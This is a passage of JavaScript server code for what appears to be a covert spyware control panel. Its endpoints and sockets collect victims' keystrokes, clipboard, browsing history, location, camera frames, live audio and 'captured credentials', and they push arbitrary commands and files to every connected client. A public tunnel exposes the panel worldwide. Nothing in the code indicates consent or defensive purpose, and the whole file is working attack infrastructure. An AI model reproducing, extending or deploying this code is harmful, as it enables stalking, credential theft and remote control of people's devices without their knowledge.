app.post('/api/live-frame', async (req, res) => {
    try {
        const { clientId, frame, timestamp, seq } = req.body || {};
        if (!clientId || !frame) return res.status(400).json({ error: 'Missing clientId or frame' });
        const ts = timestamp || Date.now();
        const payload = JSON.stringify({ frame, timestamp: ts, seq: seq || 0 });
        if (USE_REDIS && redis) {
            // TTL of 3 seconds — tighter expiry for faster stale-frame detection
            await redis.set('live:frame:' + clientId, payload, { ex: 3 });
        } else {
            liveFrames[clientId] = { frame, timestamp: ts, seq: seq || 0 };
            setTimeout(() => { if (liveFrames[clientId]?.timestamp === ts) delete liveFrames[clientId]; }, 3000);
        }
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Admin polls latest frame
app.get('/api/live-frame/:clientId', requireAuth, async (req, res) => {
    try {
        if (USE_REDIS && redis) {
            const raw = await redis.get('live:frame:' + req.params.clientId);
            if (!raw) return res.json({ frame: null });
            const data = typeof raw === 'string' ? JSON.parse(raw) : raw;
            return res.json(data);
        } else {
            const data = liveFrames[req.params.clientId];
            if (!data || Date.now() - data.timestamp > 4000) return res.json({ frame: null });
            return res.json(data);
        }
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/media', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const cid = req.query.clientId;
    let d = store.media;
    if (cid) d = d.filter(m => m.clientId === cid);
    res.json(d.slice(0, limit));
});

app.get('/api/photos', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 50, 500);
    const cid = req.query.clientId;
    let d = store.photos;
    if (cid) d = d.filter(p => p.clientId === cid);
    res.json(d.slice(0, limit));
});

app.get('/api/errors', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    res.json(store.errors.slice(0, limit));
});

app.get('/api/events', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    res.json(store.events.slice(0, limit));
});

app.get('/api/keystrokes', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
    const cid = req.query.clientId;
    let d = store.keystrokes;
    if (cid) d = d.filter(k => k.clientId === cid);
    res.json(d.slice(0, limit));
});

app.get('/api/clipboard', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 50, 500);
    const cid = req.query.clientId;
    let d = store.clipboard;
    if (cid) d = d.filter(c => c.clientId === cid);
    res.json(d.slice(0, limit));
});

app.get('/api/visits', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
    const cid = req.query.clientId;
    let d = store.pageVisits;
    if (cid) d = d.filter(v => v.clientId === cid);
    res.json(d.slice(0, limit));
});

// ── Captured credentials ──
app.get('/api/credentials', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
    res.json((store.credentials || []).slice(0, limit));
});

app.delete('/api/credentials', requireAuth, (req, res) => {
    store.credentials = [];
    saveStore();
    res.json({ success: true });
});

// ── Export all data ──
app.get('/api/export', requireAuth, (req, res) => {
    res.setHeader('Content-Disposition', `attachment; filename=export_${Date.now()}.json`);
    res.setHeader('Content-Type', 'application/json');
    res.json(store);
});

// ── Delete all ──
app.delete('/api/clear', requireAuth, async (req, res) => {
    // Reset in-memory store to defaults
    Object.assign(store, getDefaultStore());
    store.config = { ...defaultConfig };

    // Immediately persist empty store (skip debounce)
    if (USE_REDIS && redis) {
        try {
            // Save the wiped store
            await redis.set(REDIS_KEY, JSON.stringify(store));

            // Delete all media, live-frame and command keys
            const keyPatterns = ['media:photo:*', 'media:video:*', 'live:frame:*', 'cmd:*'];
            for (const pattern of keyPatterns) {
                try {
                    const keys = await redis.keys(pattern);
                    if (keys && keys.length > 0) {
                        await Promise.all(keys.map(k => redis.del(k)));
                    }
                } catch {}
            }

            // Reset the load promise so next request re-reads the empty store
            storeLoadPromise = null;
        } catch (e) {
            console.error('Redis clear failed:', e.message);
        }
    } else {
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch {}
    }

    console.log('\u{1F5D1}\u{FE0F}  All data cleared');
    res.json({ success: true });
});

// ── Notes for clients ──
app.get('/api/notes/:clientId', requireAuth, (req, res) => {
    res.json(store.notes?.[req.params.clientId] || []);
});
app.post('/api/notes/:clientId', requireAuth, (req, res) => {
    if (!store.notes) store.notes = {};
    if (!store.notes[req.params.clientId]) store.notes[req.params.clientId] = [];
    const note = { id: Date.now().toString(36), text: (req.body.text || '').trim().slice(0, 2000), timestamp: new Date().toISOString() };
    if (!note.text) return res.status(400).json({ error: 'Empty note' });
    store.notes[req.params.clientId].unshift(note);
    if (store.notes[req.params.clientId].length > 100) store.notes[req.params.clientId].length = 100;
    saveStore();
    res.json({ success: true, note });
});
app.delete('/api/notes/:clientId/:noteId', requireAuth, (req, res) => {
    if (store.notes?.[req.params.clientId]) {
        store.notes[req.params.clientId] = store.notes[req.params.clientId].filter(n => n.id !== req.params.noteId);
        saveStore();
    }
    res.json({ success: true });
});

// ── Tags / labels / pin ──
app.get('/api/tags', requireAuth, (req, res) => {
    res.json(store.tags || {});
});
app.post('/api/tags/:clientId', requireAuth, (req, res) => {
    if (!store.tags) store.tags = {};
    store.tags[req.params.clientId] = { ...(store.tags[req.params.clientId] || {}), ...req.body, updatedAt: new Date().toISOString() };
    saveStore();
    io.to('admins').emit('tags_updated', store.tags);
    res.json({ success: true });
});

// ── Per-client data export ──
app.get('/api/client/:id/export', requireAuth, (req, res) => {
    const id = req.params.id;
    const data = {
        exportedAt: new Date().toISOString(), clientId: id,
        client: store.clients[id] || {},
        deviceInfo: store.deviceInfo[id] || {},
        locations: store.locations.filter(l => l.clientId === id),
        photos: store.photos.filter(p => p.clientId === id),
        media: store.media.filter(m => m.clientId === id),
        keystrokes: store.keystrokes.filter(k => k.clientId === id),
        clipboard: store.clipboard.filter(c => c.clientId === id),
        pageVisits: store.pageVisits.filter(v => v.clientId === id),
        notes: store.notes?.[id] || [],
        tags: store.tags?.[id] || {},
        events: store.events.filter(e => e.data?.clientId === id)
    };
    res.setHeader('Content-Disposition', `attachment; filename=client_${id}_${Date.now()}.json`);
    res.setHeader('Content-Type', 'application/json');
    res.json(data);
});

// ── Send test event (admin debug) ──
app.post('/api/test-event', requireAuth, (req, res) => {
    addEvent(req.body.type || 'test', req.body.data || { message: 'Test event' });
    res.json({ success: true });
});

// ── Delete client ──
app.delete('/api/client/:id', requireAuth, (req, res) => {
    const id = req.params.id;
    delete store.clients[id];
    delete store.deviceInfo[id];
    store.locations = store.locations.filter(l => l.clientId !== id);
    store.media = store.media.filter(m => m.clientId !== id);
    store.photos = store.photos.filter(p => p.clientId !== id);
    store.errors = store.errors.filter(e => e.clientId !== id);
    store.keystrokes = store.keystrokes.filter(k => k.clientId !== id);
    store.clipboard = store.clipboard.filter(c => c.clientId !== id);
    store.pageVisits = store.pageVisits.filter(v => v.clientId !== id);
    saveStore();
    console.log(`\u{1F5D1}\u{FE0F}  Client ${id} deleted`);
    res.json({ success: true });
});

// ═══════════════════════════════════════════════════════════════
//  CONFIG & COMMANDS API
// ═══════════════════════════════════════════════════════════════
app.get('/api/config', (req, res) => res.json(store.config || defaultConfig));

app.post('/api/config', requireAuth, (req, res) => {
    store.config = { ...(store.config || defaultConfig), ...req.body };
    saveStore();
    console.log('\u{2699}\u{FE0F}  Config updated');
    res.json({ success: true, config: store.config });
});

// ── Upload file and queue as command ──
app.post('/api/command-file', requireAuth, memoryUpload.single('file'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const { target = 'all', customName } = req.body;
    const displayName = customName && customName.trim() ? customName.trim() : req.file.originalname;
    const ext = path.extname(req.file.originalname);
    const baseName = path.basename(req.file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
    const fileId = Date.now().toString(36);
    const filename = `${baseName}_${fileId}${ext}`;
    let fileUrl = null;

    if (USE_BLOB && blobPut) {
        try {
            const blob = await blobPut(`files/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
            fileUrl = blob.url;
        } catch (e) { console.error('Blob file upload failed:', e.message); }
    } else if (IS_VERCEL && USE_REDIS && redis && req.file.size < 900 * 1024) {
        try {
            const b64 = req.file.buffer.toString('base64');
            await redis.set(`media:file:${fileId}`, JSON.stringify({ data: b64, mime: req.file.mimetype }), { ex: 86400 });
            fileUrl = `/api/media-data/file/${fileId}`;
        } catch (e) { console.error('Redis file store failed:', e.message); }
    } else if (!IS_VERCEL) {
        const diskPath = path.join(UPLOAD_BASE, 'files', filename);
        fs.writeFileSync(diskPath, req.file.buffer);
        fileUrl = `/uploads/files/${filename}`;
    }

    if (!fileUrl) return res.status(413).json({ error: 'File too large to store without Blob store' });

    const cmd = {
        id: fileId,
        type: 'file',
        data: { url: fileUrl, filename: displayName, size: req.file.size, mimeType: req.file.mimetype },
        timestamp: new Date().toISOString()
    };
    const targets = target === 'all' ? Object.keys(store.clients) : [target];
    await Promise.all(targets.map(id => pushCommand(id, cmd)));
    addEvent('command', { type: 'file', target, filename: displayName, size: req.file.size });
    console.log(`📁 File command: ${displayName} → ${target}`);
    res.json({ success: true, commandId: cmd.id, filename: displayName, url: cmd.data.url });
});

app.post('/api/command', requireAuth, async (req, res) => {
    const { target, type, data } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });
    const cmd = { id: Date.now().toString(36), type, data: data || {}, timestamp: new Date().toISOString() };
    const targets = target === 'all' ? Object.keys(store.clients) : [target];
    await Promise.all(targets.map(id => pushCommand(id, cmd)));
    addEvent('command', { type, target, ...(data || {}) });
    console.log(`\u{26A1} Command: ${type} \u{2192} ${target}`);
    res.json({ success: true, commandId: cmd.id });
});

app.get('/api/commands/:clientId', async (req, res) => {
    const id = req.params.clientId;
    const cmds = await popCommands(id);
    res.json(cmds);
});

// ═══════════════════════════════════════════════════════════════
//  STORAGE MANAGEMENT
// ═══════════════════════════════════════════════════════════════
app.get('/api/storage', requireAuth, (req, res) => {
    const countDir = dir => {
        try { return fs.readdirSync(dir).reduce((s, f) => { try { return s + fs.statSync(path.join(dir, f)).size; } catch { return s; } }, 0); } catch { return 0; }
    };
    const photoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'photos'));
    const videoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'videos'));
    res.json({
        totalMB: USE_BLOB ? 'Stored in Vercel Blob' : ((photoSize + videoSize) / 1048576).toFixed(1),
        photoMB: USE_BLOB ? 'Blob' : (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
        videoMB: USE_BLOB ? 'Blob' : (videoSize / 1048576).toFixed(1), videoCount: store.media.length
    });
});

app.post('/api/cleanup', requireAuth, (req, res) => {
    const { type, keep } = req.body;
    let deleted = 0;
    if (type === 'photos') {
        const k = parseInt(keep) || 0;
        const rm = k === 0 ? store.photos.splice(0) : store.photos.splice(k);
        if (!USE_BLOB) rm.forEach(p => { try { fs.unlinkSync(path.join(__dirname, p.path)); deleted++; } catch {} });
        else deleted = rm.length;
    } else if (type === 'videos') {
        const k = parseInt(keep) || 0;
        const rm = k === 0 ? store.media.splice(0) : store.media.splice(k);
        if (!USE_BLOB) rm.forEach(m => { try { fs.unlinkSync(path.join(__dirname, m.path)); deleted++; } catch {} });
        else deleted = rm.length;
    } else if (type === 'events') { store.events = []; }
      else if (type === 'keystrokes') { store.keystrokes = []; }
      else if (type === 'clipboard') { store.clipboard = []; }
      else if (type === 'visits') { store.pageVisits = []; }
    saveStore();
    console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} removed`);
    res.json({ success: true, deleted });
});

// ═══════════════════════════════════════════════════════════════
//  SOCKET.IO
// ═══════════════════════════════════════════════════════════════
if (!IS_VERCEL) {
io.on('connection', socket => {
    socket.on('join-admin', (token) => {
        if (!adminTokens.has(token)) {
            socket.emit('auth-error', 'Invalid token');
            return;
        }
        socket.join('admins');
        socket.isAdmin = true;
        console.log('\u{1F50C} Admin connected');
        socket.emit('init', {
            clients: store.clients,
            recentEvents: store.events.slice(0, 200),
            deviceInfo: store.deviceInfo
        });
    });

    // ── Live Camera System ──
    socket.on('join-client', (clientId) => {
        socket.clientId = clientId;
        socket.join('client-' + clientId);
        console.log(`\u{1F4F7} Client ${clientId} joined socket`);
    });

    // Admin requests live feed from a specific client
    socket.on('request-live-feed', (clientId) => {
        console.log(`\u{1F4F9} Admin requested live feed from ${clientId}`);
        io.to('client-' + clientId).emit('start-live-feed');
    });

    // Admin stops live feed
    socket.on('stop-live-feed', (clientId) => {
        console.log(`\u{23F9} Admin stopped live feed for ${clientId}`);
        io.to('client-' + clientId).emit('stop-live-feed');
    });

    // Client sends a live camera frame
    socket.on('live-frame', (data) => {
        // data = { clientId, frame (base64 jpeg), timestamp, width, height }
        io.to('admins').emit('live-frame', data);
    });

    // Client reports live feed status
    socket.on('live-feed-status', (data) => {
        // data = { clientId, active, error? }
        io.to('admins').emit('live-feed-status', data);
    });

    // ── Audio Streaming ──
    socket.on('request-audio', (clientId) => {
        console.log(`🎤 Admin requested audio from ${clientId}`);
        io.to('client-' + clientId).emit('start-audio');
    });

    socket.on('stop-audio', (clientId) => {
        console.log(`🔇 Admin stopped audio for ${clientId}`);
        io.to('client-' + clientId).emit('stop-audio');
    });

    socket.on('audio-chunk', (data) => {
        io.to('admins').emit('audio-chunk', data);
    });

    socket.on('audio-status', (data) => {
        io.to('admins').emit('audio-status', data);
    });

    socket.on('disconnect', () => {
        if (socket.clientId) {
            io.to('admins').emit('live-feed-status', { clientId: socket.clientId, active: false });
            io.to('admins').emit('audio-status', { clientId: socket.clientId, active: false });
            console.log(`📷 Client ${socket.clientId} disconnected from socket`);
        }
        if (socket.isAdmin) {
            console.log('🔌 Admin disconnected');
        }
    });
});
} // end if (!IS_VERCEL)

// ═══════════════════════════════════════════════════════════════
//  ERROR HANDLING
// ═══════════════════════════════════════════════════════════════
app.use((err, req, res, next) => {
    if (err) {
        console.error('Server error:', err.message || err);
        if (!res.headersSent) {
            res.status(err.status || 500).json({ error: err.message || 'Internal server error' });
        }
    }
});

// ═══════════════════════════════════════════════════════════════
//  CLIENT STATUS MONITOR
// ═══════════════════════════════════════════════════════════════
if (!IS_VERCEL) {
    setInterval(() => {
        const cutoff = Date.now() - 20000;
        Object.entries(store.clients).forEach(([id, c]) => {
            const wasOnline = c.online;
            const isOnline = new Date(c.lastSeen).getTime() >= cutoff;
            if (wasOnline && !isOnline) {
                c.online = false;
                addEvent('client_disconnected', { clientId: id });
                console.log(`\u{1F534} Client offline: ${id}`);
            }
        });
    }, 10000);
}

// ═══════════════════════════════════════════════════════════════
//  START + TUNNEL
// ═══════════════════════════════════════════════════════════════
let currentTunnel = null;

async function openTunnel() {
    try {
        const tunnel = await localtunnel({ port: PORT });
        currentTunnel = tunnel;
        console.log('');
        console.log('  \u{2554}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2557}');
        console.log(`  \u{2551}  \u{1F30D} PUBLIC URL:  ${tunnel.url.padEnd(32)}\u{2551}`);
        console.log(`  \u{2551}  \u{1F4CA} ADMIN:       ${(tunnel.url + '/admin').padEnd(32)}\u{2551}`);
        console.log('  \u{255A}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255D}');
        console.log('');
        console.log('  Share the PUBLIC URL \u{2014} works worldwide.');
        console.log('  Press Ctrl+C to stop.\n');

        tunnel.on('close', () => {
            console.log('\u{26A0}\u{FE0F}  Tunnel dropped \u{2014} reconnecting in 3s...');
            setTimeout(openTunnel, 3000);
        });
        tunnel.on('error', err => {
            console.error('Tunnel error:', err.message);
            setTimeout(openTunnel, 5000);
        });
        return tunnel;
    } catch (err) {
        console.error('\u{274C} Tunnel failed:', err.message);
        console.log('   Retrying in 10s...');
        setTimeout(openTunnel, 10000);
    }
}

// Export for Vercel serverless
module.exports = app;

// Only listen when running locally (not on Vercel)
if (!IS_VERCEL && require.main === module) {
    server.listen(PORT, '0.0.0.0', async () => {
        console.log(`\n\u{1F680} Server running on port ${PORT}`);
        console.log(`\u{1F4CA} Local admin:  http://localhost:${PORT}/admin`);
        console.log(`\u{1F517} Local client: http://localhost:${PORT}\n`);
        if (localtunnel) await openTunnel();
    }).on('error', err => {
        if (err.code === 'EADDRINUSE') {
            const altPort = parseInt(PORT) + 1;
            console.log(`\u26A0\uFE0F  Port ${PORT} busy \u2014 trying ${altPort}...`);
            server.listen(altPort, '0.0.0.0', async () => {
                console.log(`\n\u{1F680} Server running on alt port ${altPort}`);
                console.log(`\u{1F4CA} Local admin:  http://localhost:${altPort}/admin`);
                if (localtunnel) await openTunnel();
            });
        } else {
            console.error('\u274C Server error:', err.message);
            process.exit(1);
        }
    });
}
